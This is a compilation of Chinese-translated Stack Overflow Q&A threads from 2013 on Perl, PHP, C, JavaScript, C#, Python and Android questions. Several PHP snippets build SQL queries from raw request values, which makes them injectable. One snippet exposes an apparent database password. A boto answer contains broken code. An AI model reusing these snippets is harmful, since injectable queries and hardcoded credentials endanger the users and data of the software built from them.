> 时间：2013-02-20T10:27:51.953
> 
> 标签：regex, perl, map

我有一个看起来像这样的列表：

```
__DATA__
49103393193[0-9]{1,3};+49103/393193-0;Company 1;Street;Number;Postal Code;City 
```

现在我将一个包含这些值的大列表加载到一个看起来像这样的哈希中：

```
%voicePrefix = (
  '49103393193[0-9]{1,3}' => [
                              '+49103/393193-0',
                              'Company 1',
                              'Street'
                              'Number'
                              'Postal Code'
                              'City'
                             ],
); 
```

我这样做：

```
my %voicePrefix = map {
  chomp;
  my @fields = split ';';
  shift @fields => \@fields;
} __DATA__;
my $voiceRegex = '(' . join('|',map{quotemeta} keys %voicePrefix) . ')'; 
```

现在的问题是我有另一个包含很多数字的列表，所以假设我将一个文件加载到@lines，它看起来像这样：

```
__@lines__
4910339319344;Test 1
49103393193411;Test 2
49103393193941;Test 3 
```

现在我想做的是对我这样做的数字使用正则表达式，但它确实不起作用它永远找不到匹配项

```
my @lines = __FILEUPTHERE__;
my @line;

my $company;

for(my $i = 0; i < @lines; $i++)
{
    #Split Line
    @line = split( /,/, $lines[$i] );

    #NO MATCH HERE
    $company = $voicePrefix{$1}[1] if ($line[0] =~ /$voiceRegex/);
} 
```

我希望有人可以帮助我解决这个问题。

谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:37:31.817

您`quotemeta`在构建正则表达式时正在使用，这意味着您的所有哈希键都将在正则表达式中逐字处理。您正在寻找文字 string `49103393193[0-9]{1,3}`，而不是后跟 1-3 位数字的数字。

删除`map{quotemeta}`，你应该没问题。

*注意：如果输入不是来自受信任的来源，则从输入中获取正则表达式是一个安全漏洞。*

**更新：**此外，您几乎不需要`for`在 Perl 中使用 C 风格的循环。应该避免它们。反而：

```
foreach my $line (@lines)
{
    #Declare a variable here if you are using it here.
    my @fields = split( /,/, $line );

    $company = $voicePrefix{$1}[1] if ($fields[0] =~ /$voiceRegex/);
} 
```

**更新 2：**您可能还想在您的正则表达式中添加锚点，以确保您匹配的是确切的字符串，而不是较长字符串的子集：`/^$voiceRegex$/`.

**更新 3：**通过这些更正，匹配有效。但是，您还有一个问题，因为您试图将匹配的号码用作`voicePrefix`. 但是，这是行不通的，因为 voicePrefix 的键是正则表达式，而不是可能匹配此类正则表达式的数字。需要更改您的设计。最简单的方法是不创建一个大的正则表达式，而只是测试每个键以查看是否匹配：

```
foreach my $line (@lines)
{
    #Declare a variable here if you are using it here.
    my @fields = split( /;/, $line );

    foreach my $regex (keys %voicePrefix)
    {
        $company = $voicePrefix{$regex}[1] if ($fields[0] =~ /$regex/);
    }
} 
```

# php - 将数据从 php 返回到 android 应用程序的 Ajax 代码

> ID：14977557
> 
> 赞同：0
> 
> 时间：2013-02-20T10:27:57.387
> 
> 标签：php, android, mysql, ajax, json

嗨，我编写了一个使用 mysql 数据的 android 应用程序。我正在使用 php 连接到 mysql 数据。

我正在使用 ajax 将值发送到 php 文件。我的问题是发送回从数据库中获取的数据的 php 代码是什么；我需要在 php 文件中编写的代码的语法和结构。

这就是我正在做的事情。

```
 private void executeAjaxRequest(){
        if(mListAdapter != null){
            mListAdapter.clear();
        }
        mClient = myPrefs.getString("client", "all");
        String url = mDataUrl+"?client="+mClient+"&request="+mRequest+"&location="+mLocation;       
        Log.v("url",url); 

        AsyncHttpClient httpclient = new AsyncHttpClient();
        httpclient.get(url, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(String response) {
                setOutletData(response);
                Log.i("TAG",response);
            }
        });
    } 
```

这是我得到结果的地方。

```
private void setOutletData(String response){        
        /** Creating array adapter to set data in ListView using AJAX Data*/

        try{            
          ArrayList<StoreDetails> store_details_list = new ArrayList<StoreDetails>();
          Log.v("response",response);
          mStoreDetailsList = Utils.ToArrayList(new JSONArray(response));
          Log.v("store_list",mStoreDetailsList.toString());

          Iterator<String> i = mStoreDetailsList.iterator();          
          String json_store = "";

          //Loop the list
          while( i.hasNext() ){
            json_store = i.next();
            JSONObject store = new JSONObject( json_store );

            JSONArray the_json_array = store.getJSONArray("1");

            System.out.println(the_json_array);
            String row = "";

           // use Json array to normal array covertion..

            //Create a StoreDetails object and add it to the ArrayList Of StoreDetails
            store_details_list.add( new StoreDetails( store ) );            
          }     
          //Set the data adapter for the List

          StoreListItemAdapter sla = new StoreListItemAdapter( getActivity() , R.layout.storelist_item , store_details_list );
          sla.notifyDataSetChanged();
          setListAdapter(sla  );
        }
        catch(JSONException e){
          e.printStackTrace();
        } 
```

这是我的 php 代码。

```
<?php
error_reporting(0);

//$url = $_GET['url'];
//$mR = $_GET['mRequest'];
//$mOid = $_GET['mOutletId'];
//$mloc = $_GET['mLocation'];
//connect to the db
$user = "root";
$pswd = "";
$db = "recommendations_db";
$host = "localhost";
$conn = mysql_connect($host, $user, $pswd);
mysql_select_db($db);
//if($mR == 'outlets' && $mloc = 'all'){
$query = "SELECT * FROM outlets";
$result = mysql_query($query) or die("Unable to verify user because : " . mysql_error());

while($row = mysql_fetch_array($result))
  {
  $output[] = $row; 
  }
print( json_encode($output) );
?> 
```

但是数据没有显示在模拟器中，它只显示在日志猫中作为信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T15:42:20.133

在 php 端尝试以下操作。它返回一个命名的 json 对象（json_obj）。这可能会解决您的问题。

```
$rows = array();
while($row = mysql_fetch_assoc($result)){
    $rows[] = $row;
}
echo "{\"json_obj\":";   
echo json_encode($rows);
echo "}"; 
```

# c - 如何在我的程序中检测到标准输出已关闭（当 telnet 会话关闭时）？

> ID：14977562
> 
> 赞同：2
> 
> 时间：2013-02-20T10:28:24.373
> 
> 标签：c, linux, stdout

我正在嵌入式 Linux 上开发一个程序。我的程序是一个守护进程，并且有一个日志功能，可以使用`printf`（stdout 输出）输出日志。

因此，如果我在嵌入式 Linux 系统上打开一个 telnet 会话，然后启动我的程序，我将在 telnet 会话中显示输出。我想知道如果我关闭 telnet 会话，输出会发生什么。输出重定向到哪里？

当我关闭 telnet 会话时，是否可以检查*stdout是否关闭？*为了避免在标准输出关闭时执行我的日志功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:37:48.363

[`ftell`](http://pubs.opengroup.org/onlinepubs/009695299/functions/ftell.html)在这里可能很方便。可以检查`EBADF`错误并停止任何进一步的写入。在 C 中，写入未打开的文件句柄会导致未定义的行为。

我不确定关闭您的 telnet 会话是否有问题，因为如果您使用的是类似 shell 的环境，环境本身可能会被杀死。我不太确定那里的行为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:42:26.613

守护进程应该处理 SIGHUP，这是终端将在关闭时生成的信号。如果你不处理它，你的守护进程将用 telnet 终止。

如果 fd 断开连接，输出将丢失。通常，对于日志记录，您应该使用 syslog() 调用。

# php - 使用 jquery、ajax 和 php 将 div 中的更新数据保存到数据库

> ID：14977567
> 
> 赞同：1
> 
> 时间：2013-02-20T10:28:37.203
> 
> 标签：php, javascript, jquery, ajax, html

我有一个 div，其中包含电子表格的表行和列（我正在使用[http://jquerysheet.googlecode.com/svn/branches/3.x/jquery.sheet.html](http://jquerysheet.googlecode.com/svn/branches/3.x/jquery.sheet.html)），单击按钮时我使用 ajax 来获取将 div 中的内容按 id 存入数据库。问题是当我更新电子表格并保存时，它不会将更新的内容发送到数据库。它宁愿发送默认内容。

## 按钮

```
<a href='#' id="fat-btn" class="btn btn-info" data-loading-text="Saving, Please Wait ..."> Save Sheet </a> 
```

## jQuery / 阿贾克斯

```
$('#fat-btn').click(function() {

            var content = $('#sheetParent').html();

            $.ajax({
                url: 'sendtodatabase.php',
                type: 'POST',
                data: {
                    content: content
                }
            });
        });

    }); 
```

## 发送到数据库.php

```
<?php

require_once("conn.php");

$resval=$_REQUEST['content'];

$ins=mysql_query("update tabula set sheet='$resval' where id='5'")or die(mysql_error());

?> 
```

## 分区

```
<div id="sheetParent">    

<table width="100%" border="0" cellspacing="0" cellpadding="0">
 <tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>

</table> 
```

谁能帮助我如何将更新的 div 内容导入数据库？注意：我是新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T14:17:04.347

您尝试放入数据库的 div 不包含您要保存的数据，它呈现在一个新元素中（我建议您查看工作表的实际来源，您会发现有很多事情发生（jSUI等）。你尝试过这个活动吗？

```
sheetSave: function(e, jS, tables) 
```

作为参数之一的“表格”应该为您提供您正在寻找的数据。hth

# javascript - 1 + undefined 的结果是什么

> ID：14977569
> 
> 赞同：6
> 
> 时间：2013-02-20T10:28:56.237
> 
> 标签：javascript

```
1 + undefined = ? 
```

1.  首先，String(undefined) 得到字符串“undefined”
2.  二、1+“未定义”=“1未定义”

怎么了？

我在 chrome 控制台中运行它，它返回`NaN`。

你能解释一下结果吗？

我认为它应该是“1undefined”。tks

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-02-20T10:40:09.537

`NaN`是`Number`操作失败的结果。

```
1 + undefined           // NaN
"1" + undefined         // "1undefined"
1 + "" + undefined      // "1undefined"
1 + ("" + undefined)    // "1undefined"
typeof NaN              // "number"
typeof undefined        // "undefined"
NaN === NaN             // false (it's not reflexive!)
undefined === undefined // true (it's reflexive)
NaN.toString()          // "NaN" 
```

`NaN`表示**不是**预期数字的数字。任何数字操作`NaN`也将导致`NaN`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-24T03:40:06.000

您期望字符串连接，但只有当您至少有一个字符串时才会发生这种情况。在您的示例中，没有什么是字符串。`1`不是字符串，`undefined`也不是字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:30:31.747

1 + 未定义 = NaN

当你这样做时，`1 + "undefined"`你将 1 连接到 String`"undefined"`导致字符串`"1undefined"`

undefined is nothing or like Null in other language (variable is not set)

在 Javascript 中，null 是值的预期缺失（在某处设置为 null），而 undefined 是值的意外缺失（从不设置）

你想要完成什么？

# c# - 如何在我的项目设置中添加 SQL Server 数据库

> ID：14977571
> 
> 赞同：0
> 
> 时间：2013-02-20T10:29:08.473
> 
> 标签：c#, sql, sql-server, project, installation

我正在使用带有 C# 的 Visual Studio 2010，并且正在制作一个项目。我在我的项目中使用了 SQL Server 数据库，但我无法完成。我无法设置（exe）。如何在我的项目设置中添加 SQL 服务器？我找不到任何视频或文章

谢谢大家

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:38:00.867

您可以搜索[SQL Server 管理对象](http://msdn.microsoft.com/en-us//library/ms162169.aspx)。

您需要创建一个像 DBConfig 之类的项目，并且需要在设置中添加该项目。在您的 DbConfig 项目中，您可以使用 SMO 概念来读取数据库、表、执行查询等。

希望这会有所帮助。

# entity-framework - 实体框架 - 无法创建关联

> ID：14977574
> 
> 赞同：0
> 
> 时间：2013-02-20T10:29:19.477
> 
> 标签：entity-framework

我的 SQL 数据库只有 3 个表。1 称为 Country，另一个称为 CountryAlias，最后一个称为 Person。

![在此处输入图像描述](../Images/02f93befdc0761232190589e68f894ae.png)

tblCounty 和 tblCountyAlias 之间的关系是一对多，使用两者中的 [Country] 列作为相关列。然后 tblCountry 和 Person 之间的关系是相同的。这个例子应该是相当教科书的。

我遇到的问题是，似乎 EF 希望我只通过主键（或者我应该称之为实体键）进行关联。所以，我的问题是：

1) EF 是否只希望我在实体的至少一侧使用实体密钥的情况下进行关联

2）实体键是否与主键相同（即，将其从 ID 中删除并将 Country 设为实体键是否安全）？

3）我是否在与 EF 想要的工作方式作斗争。学习 WPF 意味着战斗只会导致很多痛苦和失败，但我不确定这是否也适用于 EF？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T13:21:16.347

首先，您没有指定使用哪种类型的实体框架，但是从上下文（实体键）我猜您最有可能使用的是代码优先类型（或者可能是模型优先）

为了使您的关联有效，您的模型应如下所示： ![在此处输入图像描述](../Images/c574e09bccfdf3c87e37b391cd891c5b.png)

如您所见，使用字符串类型的主键并不违反实体框架的任何规则。（我在 Person 表中包含了一个 Id，因为一个人的名字可能不是唯一的）

**根据我的经验**，答案是：****

 **1）当您在 MSSQL 中创建具有 1 到多的外键时，第一侧（在这种情况下为 tblCountry）列必须是唯一的。请参阅[创建没有主键的外键](https://stackoverflow.com/questions/5442785/create-foreign-key-without-a-primary-key) 所以基本上它不必是主键，但使用主键要容易得多。但是这个主键可以映射到一个字符串属性，或者也可以映射到多个属性（参见复合主键）

2）是的，它是相同的，我假设 Country 列映射到一个可以唯一的字符串属性，因此将其用作实体键是完全安全的。

3) 不，你不是在为方式而战，即使你是，我认为人们应该总是与 API 斗争一下，以了解它的限制和特性。

我希望这有帮助！

顺便说一句，当您在模型中创建新实体时（右键单击模型并添加新选项），您可以选择所需的任何实体键，如下所示：

![在此处输入图像描述](../Images/e189b7477944b1ec312fcf1b278d5b09.png)**

# c# - 从项目文件夹中删除 .sqlite 文件

> ID：14977577
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:29:28.887
> 
> 标签：c#, visual-studio, sqlite

我正在创建一个应用程序，它需要一个 SQLite 数据库来存储用户所做的设置，因此下次启动应用程序时会记住它。

我知道有一些方法可以使用这种方式在该项目文件夹中创建一个文件：

```
string path = string.Format(System.IO.Directory.GetCurrentDirectory() + @"\PigeonBackup.sqlite");

        if (!File.Exists(path))
        {
            SQLiteConnection.CreateFile(string.Format(System.IO.Directory.GetCurrentDirectory() + @"\PigeonBackup.sqlite")); 
```

但是我经常调试这个应用程序，有一个按钮之类的东西会很有用，它会从我的项目文件夹中删除 .sqlite 文件。有什么课程可以帮助我解决我的问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:40:41.390

如果要**删除所有带有扩展名的文件，** `.sqllite`请尝试以下代码：

```
DirectoryInfo di = new DirectoryInfo(System.IO.Directory.GetCurrentDirectory());
FileInfo[] files = di.GetFiles("*.sqlite")
                     .Where(p => p.Extension == ".sqlite").ToArray();
foreach (FileInfo file in files)
  try
  {
    file.Attributes = FileAttributes.Normal;
    File.Delete(file.FullName);
  }
  catch { } 
```

如果要**删除特定文件**，请尝试以下代码：

```
string path = System.IO.Path.Combine(@System.IO.Directory.GetCurrentDirectory() + @"\PigeonBackup.sqlite");
System.IO.File.Delete(path); 
```

# python - 如何在 Pyglet 中加载来自同一家族的字体变体？

> ID：14977583
> 
> 赞同：1
> 
> 时间：2013-02-20T10:29:45.077
> 
> 标签：python, fonts, pyglet

我想在 Pyglet 中显示多个具有各种字体的文本标签。在这种情况下，我使用的是“Ubuntu”字体，粗体，有时是斜体。在这种情况下，我有`Ubuntu-B.ttf`和`Ubuntu-BI.ttf`作为字体文件。

按照说明的[指示](http://www.pyglet.org/doc/programming_guide/loading_custom_fonts.html)，我正在加载字体：

```
pyglet.font.add_file(font_filename) 
```

然后使用它的*面名*（我硬编码“Ubuntu”，因为我看不到从字体文件中获取它的方法）：

```
label = pyglet.text.Label(text="Hello", font_name="Ubuntu", font_size=16) 
```

不幸的是，Pyglet 字体系统似乎只注册了第一个具有该面名的字体`Ubuntu`，并且它将它用于字体的所有实例，斜体或其他。

所以如果我先加载`Ubuntu-BI.ttf`，那么所有的用途`Ubuntu`都是斜体。如果我`Ubuntu-B.ttf`先加载，那么所有使用都是非斜体粗体，即使我在稍后阶段加载斜体字体也是如此。

我看不到在运行时清除或删除加载字体的明显方法。有没有办法处理这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T21:27:45.657

我找到了自己的解决方案。有一个未记录的类`pyglet.font.ttf.TruetypeInfo`，可用于获取特定字体文件的正确*面名。*这允许我在尝试使用不同字体时使用正确的人脸名称（而不是依赖 Pyglet 根据不完整的人脸名称选择最佳选项）。所以我现在可以直接使用我需要的字体了：

```
def load_font(path):
    # load external font from file
    p = TruetypeInfo(path)
    name = p.get_name("name")
    p.close()
    font.add_file(path)
    print("Loaded font " + name + " from " + path) 
```

参考[pyglet-users](https://groups.google.com/forum/?fromgroups=#!topic/pyglet-users/MDEU_fyJkkA)线程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-13T02:53:49.293

基于 meowsqueak 的回答，您可能想要使用`get_name('family')`而不是`get_name('name')`. 更具体地说，就我而言，我有一个仅包含粗体版本的 .ttf 文件。使用

```
 p = pyglet.font.ttf.TruetypeInfo(path)
    print p.get_name('name')
    print p.get_name('family') 
```

生产

```
Orbitron Bold
Orbitron 
```

pyglet 没有选择字体

```
pyglet.text.Label(text="Text", font_name='Orbitron Bold') 
```

但

```
pyglet.text.Label(text="Text", font_name='Orbitron', bold=True, 
```

工作。

# graphics - 用 TimeCouter 和高分扩展我的小游戏

> ID：14977589
> 
> 赞同：1
> 
> 时间：2013-02-20T10:30:12.280
> 
> 标签：graphics, timer, jframe, keylistener

Hello Together 最近我了解了 keyListeners，所以我尝试用它编写一个小游戏。现在它已经完成了，但我想实现一些额外的功能。我想到了一个计时器左右。所以你只能玩 1 分钟左右.. 之后它会计算你的分数并将其添加到 higescores 但我不知道我怎么能做到这一点。如果有人可以帮助我，我会很高兴。谢谢。

现在我所有的代码都在一个类中。这就是我得到的：

```
import java.awt.Graphics;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import javax.swing.JFrame;
import javax.swing.JPanel;
import java.awt.Color;
import java.awt.Container;
import java.awt.Font;

public class Main extends JPanel implements KeyListener {
    private static final long serialVersionUID = 1L;

    private static int x = 350;
    private static int y = 350;
    private static int punkte = 0;
    private static boolean isThere = true;
    private static int apx = 250;
    private static int apy = 350;

    public Main() {
        addKeyListener(this);
    }

    public void keyPressed(KeyEvent evt) {
        int keyCode = evt.getKeyCode();
        int d = 0;

        if (evt.isShiftDown())
            d = 5;
        else
            d = 1;

        if (keyCode == KeyEvent.VK_LEFT) {
            x -= d;
        } else if (keyCode == KeyEvent.VK_RIGHT) {
            x += d;
        } else if (keyCode == KeyEvent.VK_UP) {

            y -= d;
        } else if (keyCode == KeyEvent.VK_DOWN) {
            y += d;
        }
    }

    public void keyReleased(KeyEvent evt) {
    }

    public void keyTyped(KeyEvent evt) {
    }

    public boolean isFocusTraversable() {
        return true;
    }

    public void paint(Graphics g) {

        int c1 = (int) (Math.floor(Math.random() * 254) + 1);
        int c2 = (int) (Math.floor(Math.random() * 254) + 1);
        int c3 = (int) (Math.floor(Math.random() * 254) + 1);

        int cx1 = (int) (Math.floor(Math.random() * 254) + 1);
        int cx2 = (int) (Math.floor(Math.random() * 254) + 1);
        int cx3 = (int) (Math.floor(Math.random() * 254) + 1);

        int x1 = (int) (Math.floor(Math.random() * 680) + 1);
        int y1 = (int) (Math.floor(Math.random() * 600) + 1);

        String punkteStr = String.valueOf(punkte);

        g.setColor(new Color(c1, c2, c3));

        g.fillRect(x, y, 50, 50);
        g.setFont(new Font("Arial", Font.BOLD, 50));
        g.drawString(punkteStr, 10, 40);
        g.setColor(new Color(cx1, cx2, cx3));
        if (isThere) {

            g.fillOval(apx, apy, 50, 50);
        }
        if (x == apx && y == apy) {
            punkte++;
            apx = (int) (Math.floor(Math.random() * 680) + 1);
            apy = (int) (Math.floor(Math.random() * 600) + 1);
        }
        repaint();
    }

    public static void main(String[] args) {
        JFrame frame = new JFrame();
        frame.setTitle("Lightning Catcher v1 by Jonas");
        frame.setSize(700, 650);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setBackground(Color.BLACK);

        Container contentPane = frame.getContentPane();
        contentPane.add(new Main());
        frame.setVisible(true);
    }
} 
```

# php - 如何将两个值从ajax传递给php

> ID：14977601
> 
> 赞同：0
> 
> 时间：2013-02-20T10:30:45.797
> 
> 标签：php, mysql, ajax

我正在开发一个表单，该表单在用户输入其代码时显示数据，到目前为止它在 AJAX 和 PHP 上运行良好，但现在我需要在用户在文本框中输入代码时显示数据并从中选择一个值我被困在这里的组合框有人可以帮助我吗？

这是我的ajax代码：

```
<script>
        function getXMLHTTP() { //function to return the xml http object
                var xmlhttp=false;  
                try{
                    xmlhttp=new XMLHttpRequest();
                }
                catch(e)    {       
                    try{            
                        xmlhttp= new ActiveXObject("Microsoft.XMLHTTP");
                    }
                    catch(e){
                        try{
                            xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
                        }
                        catch(e1){
                            xmlhttp=false;
                        }
                    }
                }

                return xmlhttp;
            }

            function showsub(strURL) {
               // var strURL="subjsele.php?makhcode="+document.nigran.makhcode.value+"&mon="+document.nigran.mon.value;
                 var u = document.getElementByID('makhcode').value;
                 var g = document.getElementByID('cmbmon').value;
                 var req = getXMLHTTP();

                if (req) {

                    req.onreadystatechange = function() {
                        if (req.readyState == 4) {
                            // only if "OK"
                            if (req.status == 200) {                        
                                document.getElementById('subcomp').innerHTML=req.responseText;                      
                            } else {
                                alert("There was a problem while using XMLHTTP:\n" + req.statusText);
                            }
                        }               
                    }           
                    req.open("GET","getuser.php?u="+u+"&g="+g, true);
                    req.send(null);
                }

            }
        </script> 
```

这是我的html

```
 <tr>
                <td align="right" width="58px"><label class="" for="element_1"><font size="3px"><b>Code</b></font></label></td><td><input id="makhcode" name="makhcode" onkeyup="showyear('makhsele.php?makh='+this.value)" onkeypress="showsub()" type="text" maxlength="6" size="6" value=""/></td><td><label class="description" align="right" for="element_1">Month</label></td><td><select id="cmbmon" name="cmbmon" class="" onchange="showsub()" style="font-size:14px;">
                                <option value="">0</option>
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>

                </td>
            </tr> 
```

这是我的 php

```
<?php
$makhcode=$_GET["makhcode"];

$mon=$_GET["cmbmon"];

$con = mysql_connect('localhost', 'cepheisys', 'rajF@1998');
if (!$con)
  {
  die('Could not connect: ' . mysql_error());
  }

mysql_select_db("pts_root", $con);

$subqry = mysql_query("SELECT * FROM subject WHERE compulsory='1'")or die(mysql_error());
echo "<table>";
while($fetch = mysql_fetch_array($subqry));
{
   $sscode  = $fetch["code"];
   $csubqry = mysql_query("SELECT * FROM nigstat WHERE makhcode='".$makhcode."' AND subcode='".$sscode."'") or die(mysql_error());
   $mmonval =  $csubqry["mon1"];

    echo "<tr>";
    echo "<td>.$mmonval.</td><td></td>";
    echo "</tr>";
    echo "<tr>";
    echo "<td width='200px'><font color='#FF0033'><strong>".$fetch[name]."</strong></td><td><input name='s_".$fetch[code]."' type='text' size='1' maxlength='2' value='$mmonval'></td><input type='hidden' name='$mmonval' size='3' maxlength='3'>";
    echo "</tr>";
}

mysql_close($con);
?> 
```

我也在使用第二个脚本来显示与代码相关的数据，它的函数是 showyear()

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:32:12.383

改变这个：

```
$makhcode=$_GET["makhcode"];

$mon=$_GET["cmbmon"]; 
```

至 ：

```
$makhcode=$_GET["u"];

$mon=$_GET["g"]; 
```

# c# - 从 C# 客户端上传文件到 IIS

> ID：14977610
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:31:15.763
> 
> 标签：c#, iis, file-upload

我有一个在 IIS6/7 中运行的应用程序。我的客户端是一个向服务器发送 HTTP 请求的 C# 应用程序（无 UI）。

实现上传机制（没有 UI 控件）的最佳方式是什么？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:33:17.800

[WebClient.UploadFile](http://msdn.microsoft.com/de-de/library/36s52zhs.aspx)方法是最简单的方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:38:57.493

您需要在服务器上创建一些东西来接收文件（检查并验证用户），例如 Http 处理程序。实现很简单 Context.Request.SaveAs(...);

客户可以：

```
 var r = WebRequest.Create("http://blabla/Update.ashx?fn=a.file");
        var content = File.ReadAllBytes("a.file");
        r.GetRequestStream().Write(content,0,content.Length);
        r.Method = "POST";
        var response = r.GetResponse(); 
```

# amazon-s3 - 如何使用 boto 或其他工具为 S3 存储桶中的文件设置 Http Header

> ID：14977613
> 
> 赞同：3
> 
> 时间：2013-02-20T10:31:19.120
> 
> 标签：amazon-s3, http-headers, boto

使用 python boto，如何修改 Http Headers？

在我的 S3 存储桶中，我有一个名为“shop”的文件，由于我上传它没有文件扩展名，我必须手动设置 Http Header: ContentType = text/html

我想使用一个使用 boto 的 python 脚本来为所有需要这个的文件设置这个头文件。但是我找不到**改变标题的方法**。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-20T17:00:58.280

```
import boto
from boto.s3.connection import S3Connection
from boto.s3.key import Key

ak = " ... key"
sk = " ... key"
bucketname = " ... "

c = S3Connection(ak, sk)

def setcontenttype():
    c = S3Connection(ak, sk)
    bucket = c.get_bucket(bucketname)
    keys = bucket.get_all_keys()
    for key in keys:
        ext = os.path.splitext(key.name)[1]
        if ext == "" and not key.name.endswith("/"):
            print key.name
            k.set_contents_from_string(k.get_contents_as_string(), {"Content-Type":"text/html"}, True) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-06T13:00:05.233

```
s3_conn = S3Connection(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)

bucket = s3_conn.get_bucket(s3_bucket_name)

keys = bucket.list()

for key in keys:
    key = bucket.get_key(key.name)
    metadata = key.metadata
    metadata['Content-Type'] = "text/html"
    key.copy(s3_bucket_name, key, metadata=metadata, preserve_acl=True) 
```

您必须知道它将替换旧的元数据，因此您应该复制所有其他元数据头（如缓存控制......）

# iphone - 如何调试崩溃的发布版本？

> ID：14977624
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:31:57.763
> 
> 标签：iphone, ios, xcode, release

我的调试版本不会崩溃，但发布版本会崩溃。

我已经修改了 Run 方案以使用产生 TestFlight 发布版本并将其安装在我的设备上。这行得通。但是应用程序在使用过程中不断崩溃。管理器窗口没有给我任何设备日志。没有崩溃报告。什么都没有。

专业人士是如何做到的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:38:16.533

一些可能性：

*   为您的 iPhone 获取控制台应用程序并查看您设备上的控制台（例如[https://itunes.apple.com/nl/app/console/id317676250?mt=8](https://itunes.apple.com/nl/app/console/id317676250?mt=8)）

*   使用另一个 Web 服务，例如 BugSense (www.bugsense.com) 来接收在线崩溃报告

*   无论如何，您的管理器窗口都应该为您提供设备日志（如果设备已连接）。您还可以尝试使用另一个 Apple 工具 ( [http://support.apple.com/kb/DL1465](http://support.apple.com/kb/DL1465) )获取设备日志

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:50:51.777

在您的应用中集成 TestFlight SDK：[https ://testflightapp.com/sdk/](https://testflightapp.com/sdk/)

# c# - 基于表单的登录和 FormAuthenticationTicket 仍然要求提供凭据

> ID：14977625
> 
> 赞同：0
> 
> 时间：2013-02-20T10:31:58.240
> 
> 标签：c#, asp.net-mvc

我正在使用带有基于表单的登录的 ASP.NET MVC3。登录过程效果很好。但是当我关闭浏览器并返回页面时，它会进入登录页面，我需要再次输入凭据。我怎样才能避免这种情况。

这是我的登录代码：

```
[HttpPost]
        public ActionResult LogOn(LogOnModel model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                if (Membership.ValidateUser(model.Username, model.Password))
                {
                    var userprofile = svc.GetUserByUsername(model.Username);

                    var serializeModel = new CustomPrincipalSerializeModel();
                    serializeModel.Username = userprofile.Username;
                    serializeModel.Name = userprofile.Name;
                    serializeModel.DisplayAs = userprofile.DisplayAs;
                    serializeModel.MarketId = userprofile.MarketId;

                    var serializer = new JavaScriptSerializer();
                    var userData = serializer.Serialize(serializeModel);

                    //FormsAuthentication.SetAuthCookie(model.Username, model.RememberMe);
                    var authTicket = new FormsAuthenticationTicket(
                        1,
                        model.Username,
                        DateTime.Now,
                        DateTime.Now.AddDays(30),
                        true,
                        userData);

                    var encTicket = FormsAuthentication.Encrypt(authTicket);
                    var faCookie = new HttpCookie(FormsAuthentication.FormsCookieName, encTicket);
                    Response.Cookies.Add(faCookie);

                    if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                        && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                    {
                        return Redirect(returnUrl);
                    }
                    else
                    {
                        return RedirectToAction("Index", "Home");
                    }
                }
                else
                {
                    ModelState.AddModelError("", "Användarnamnet eller lösenordet är felaktigt.");
                }
            }

            return View(model);
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T11:09:24.400

您需要使用持久性 cookie（根据`faCookie.Expires`您的情况设置，因为您手动创建 cookie）。

有关更多信息，请参阅[此知识库文章](http://support.microsoft.com/kb/910443)。

# android - TextView 作为带有 textcolor minipulation 的进度条？

> ID：14977626
> 
> 赞同：5
> 
> 时间：2013-02-20T10:31:58.387
> 
> 标签：android, android-layout, user-interface, animation, android-progressbar

我正在努力改进我的应用程序的用户界面。在我使用的设计中，我有一个 TextView，它将在特定时间充当进度条。ruslt 应该是这样的：

![在此处输入图像描述](../Images/bd3a7a0507c063c9a7964d68d70fc81d.png)

问题是，随着进度的变化，部分文本会改变颜色

我查看了android中的spannablestring，如果我能找到进度所涵盖的字母，它会起作用（但我认为这并不容易/准确）

我现在打算做的是使用以下内容：

*   框架布局与：
*   背景 textView 带有绿色文本和白色背景。
*   前端线性布局，在进行时会改变**宽度**。
*   具有绿色背景和与框架布局宽度匹配的白色文本的 TextView。

有更好的方法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-20T10:42:22.820

